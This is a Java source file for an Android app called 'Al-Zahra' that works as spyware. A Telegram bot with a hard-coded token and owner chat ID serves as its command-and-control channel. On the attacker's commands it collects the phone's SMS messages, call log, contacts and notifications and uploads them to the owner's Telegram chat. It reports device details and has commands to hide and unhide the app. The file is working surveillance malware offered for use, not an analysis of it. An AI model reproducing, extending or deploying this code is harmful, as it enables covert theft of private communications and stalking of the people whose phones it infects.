package com.alzahra.bot;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.alzahra.collector.CallLogCollector;
import com.alzahra.collector.ContactsCollector;
import com.alzahra.collector.NotificationCollector;
import com.alzahra.collector.SMSCollector;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String API_BASE = "https://api.telegram.org/bot%s/%s";
    private static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    private static final String OWNER_CHAT_ID = "7344776596";

    private final Context context;
    private final Handler mainHandler;
    private final ExecutorService executor;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicLong lastUpdateId = new AtomicLong(0);

    private SMSCollector smsCollector;
    private CallLogCollector callLogCollector;
    private ContactsCollector contactsCollector;
    private NotificationCollector notificationCollector;

    public interface CommandListener {
        void onCommand(String command);
    }
    private CommandListener commandListener;

    public TelegramBot(Context context) {
        this.context = context.getApplicationContext();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.executor = Executors.newFixedThreadPool(4);
        this.smsCollector = new SMSCollector(context);
        this.callLogCollector = new CallLogCollector(context);
        this.contactsCollector = new ContactsCollector(context);
        this.notificationCollector = new NotificationCollector(context);
    }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
    }

    public void start() {
        if (running.get()) return;
        running.set(true);
        Log.d(TAG, "Bot started");
        sendRaw("sendMessage", "chat_id", OWNER_CHAT_ID,
            "text", "🟢 Al-Zahra Online\n📱 " + android.os.Build.MODEL + "\n🤖 Android " + android.os.Build.VERSION.RELEASE,
            "parse_mode", "Markdown");
        startPolling();
    }

    public void stop() {
        running.set(false);
        executor.shutdownNow();
    }

    public boolean isRunning() { return running.get(); }

    public void sendToOwner(String text) {
        sendRaw("sendMessage", "chat_id", OWNER_CHAT_ID, "text", text, "parse_mode", "Markdown");
    }

    public void sendDocument(File file, String caption) {
        if (file == null || !file.exists()) { sendToOwner("❌ الملف غير موجود"); return; }
        executor.execute(() -> {
            try {
                String boundary = "----AlZahraBoundary" + System.currentTimeMillis();
                String lineEnd = "\r\n";
                URL url = new URL(String.format(API_BASE, BOT_TOKEN, "sendDocument"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setUseCaches(false);
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                writeFormField(dos, boundary, lineEnd, "chat_id", OWNER_CHAT_ID);
                writeFormField(dos, boundary, lineEnd, "caption", caption);
                writeFormField(dos, boundary, lineEnd, "parse_mode", "Markdown");
                writeFileField(dos, boundary, lineEnd, "document", file.getName(), file);
                dos.writeBytes("--" + boundary + "--" + lineEnd);
                dos.flush();
                dos.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Upload error", e);
                sendToOwner("❌ خطأ رفع: " + e.getMessage());
            }
        });
    }

    private void startPolling() {
        executor.execute(() -> {
            while (running.get()) {
                try {
                    pollOnce();
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Polling error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
                }
            }
        });
    }

    private void pollOnce() {
        try {
            String url = String.format(API_BASE, BOT_TOKEN, "getUpdates") +
                "?offset=" + (lastUpdateId.get() + 1) + "&limit=10&timeout=15";
            String response = httpGet(url);
            if (response == null) return;
            JSONObject json = new JSONObject(response);
            if (!json.optBoolean("ok", false)) return;
            JSONArray results = json.optJSONArray("result");
            if (results == null) return;
            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                long updateId = update.optLong("update_id", 0);
                lastUpdateId.set(Math.max(lastUpdateId.get(), updateId));
                processUpdate(update);
            }
        } catch (Exception e) {
            Log.e(TAG, "Poll error: " + e.getMessage());
        }
    }

    private void processUpdate(JSONObject update) {
        try {
            String command = null;
            if (update.has("message")) {
                JSONObject message = update.getJSONObject("message");
                if (message.has("text")) {
                    String chatId = String.valueOf(message.getJSONObject("chat").getLong("id"));
                    if (chatId.equals(OWNER_CHAT_ID)) {
                        command = message.getString("text").trim();
                    }
                }
            }
            if (command != null) {
                Log.d(TAG, "Command: " + command);
                handleCommand(command);
            }
        } catch (Exception e) {
            Log.e(TAG, "Process update error", e);
        }
    }

    private void handleCommand(String cmd) {
        if (commandListener != null) {
            mainHandler.post(() -> commandListener.onCommand(cmd));
        }
        String lower = cmd.toLowerCase();
        if (lower.startsWith("/start") || lower.equals("/help")) {
            sendControlPanel();
        } else if (lower.equals("/sms")) {
            executor.execute(() -> {
                sendToOwner("⏳ جاري جمع رسائل SMS...");
                try {
                    File file = smsCollector.export();
                    if (file != null) sendDocument(file, "📨 رسائل SMS");
                    else sendToOwner("❌ لا توجد رسائل");
                } catch (Exception e) { sendToOwner("❌ خطأ: " + e.getMessage()); }
            });
        } else if (lower.equals("/calls")) {
            executor.execute(() -> {
                sendToOwner("⏳ جاري جمع المكالمات...");
                try {
                    File file = callLogCollector.export();
                    if (file != null) sendDocument(file, "📞 سجل المكالمات");
                    else sendToOwner("❌ لا توجد مكالمات");
                } catch (Exception e) { sendToOwner("❌ خطأ: " + e.getMessage()); }
            });
        } else if (lower.equals("/contacts")) {
            executor.execute(() -> {
                sendToOwner("⏳ جاري جمع جهات الاتصال...");
                try {
                    File file = contactsCollector.export();
                    if (file != null) sendDocument(file, "👥 جهات الاتصال");
                    else sendToOwner("❌ لا توجد جهات اتصال");
                } catch (Exception e) { sendToOwner("❌ خطأ: " + e.getMessage()); }
            });
        } else if (lower.equals("/notifications")) {
            executor.execute(() -> {
                sendToOwner("⏳ جاري جمع الإشعارات...");
                try {
                    File file = notificationCollector.export();
                    if (file != null) sendDocument(file, "🔔 الإشعارات");
                    else sendToOwner("❌ لا توجد إشعارات");
                } catch (Exception e) { sendToOwner("❌ خطأ: " + e.getMessage()); }
            });
        } else if (lower.equals("/info")) {
            executor.execute(() -> {
                try {
                    JSONObject info = new JSONObject();
                    info.put("model", android.os.Build.MODEL);
                    info.put("android", android.os.Build.VERSION.RELEASE);
                    info.put("sdk", android.os.Build.VERSION.SDK_INT);
                    sendToOwner("📱 معلومات الجهاز\n```json\n" + info.toString(2) + "\n```");
                } catch (Exception e) { sendToOwner("❌ خطأ: " + e.getMessage()); }
            });
        } else if (lower.equals("/hide")) {
            if (commandListener != null) mainHandler.post(() -> commandListener.onCommand("CMD_HIDE"));
        } else if (lower.equals("/unhide")) {
            if (commandListener != null) mainHandler.post(() -> commandListener.onCommand("CMD_UNHIDE"));
        }
    }

    private void sendControlPanel() {
        String text = "🎛️ لوحة تحكم Al-Zahra\n\n📱 " + android.os.Build.MODEL + "\n🤖 Android " + android.os.Build.VERSION.RELEASE;
        String keyboard = "{\"inline_keyboard\":[[{\"text\":\"📨 SMS\",\"callback_data\":\"/sms\"},{\"text\":\"📞 المكالمات\",\"callback_data\":\"/calls\"}],[{\"text\":\"👥 جهات الاتصال\",\"callback_data\":\"/contacts\"},{\"text\":\"🔔 الإشعارات\",\"callback_data\":\"/notifications\"}],[{\"text\":\"📱 معلومات\",\"callback_data\":\"/info\"}],[{\"text\":\"🔒 إخفاء\",\"callback_data\":\"/hide\"},{\"text\":\"🔓 إظهار\",\"callback_data\":\"/unhide\"}]]}";
        sendRaw("sendMessage", "chat_id", OWNER_CHAT_ID, "text", text, "parse_mode", "Markdown", "reply_markup", keyboard);
    }

    private void sendRaw(String method, String... params) {
        executor.execute(() -> {
            try {
                String urlStr = String.format(API_BASE, BOT_TOKEN, method);
                if ("getUpdates".equals(method)) {
                    StringBuilder sb = new StringBuilder(urlStr);
                    for (int i = 0; i < params.length; i += 2) {
                        sb.append(i == 0 ? "?" : "&");
                        sb.append(URLEncoder.encode(params[i], "UTF-8")).append("=");
                        if (i + 1 < params.length) sb.append(URLEncoder.encode(params[i + 1], "UTF-8"));
                    }
                    httpGet(sb.toString());
                } else {
                    StringBuilder postData = new StringBuilder();
                    for (int i = 0; i < params.length; i += 2) {
                        if (i > 0) postData.append("&");
                        postData.append(URLEncoder.encode(params[i], "UTF-8")).append("=");
                        if (i + 1 < params.length) postData.append(URLEncoder.encode(params[i + 1], "UTF-8"));
                    }
                    httpPost(urlStr, postData.toString());
                }
            } catch (Exception e) { Log.e(TAG, "Send raw error", e); }
        });
    }

    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);
            int code = conn.getResponseCode();
            if (code != 200) { conn.disconnect(); return null; }
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private String httpPost(String urlStr, String data) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.getOutputStream().write(data.getBytes("UTF-8"));
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private void writeFormField(DataOutputStream dos, String boundary, String lineEnd, String name, String value) throws Exception {
        dos.writeBytes("--" + boundary + lineEnd);
        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"" + lineEnd);
        dos.writeBytes(lineEnd);
        dos.writeBytes(value + lineEnd);
    }

    private void writeFileField(DataOutputStream dos, String boundary, String lineEnd, String fieldName, String fileName, File file) throws Exception {
        dos.writeBytes("--" + boundary + lineEnd);
        dos.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileName + "\"" + lineEnd);
        dos.writeBytes("Content-Type: application/octet-stream" + lineEnd);
        dos.writeBytes(lineEnd);
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
        fis.close();
        dos.writeBytes(lineEnd);
    }
}
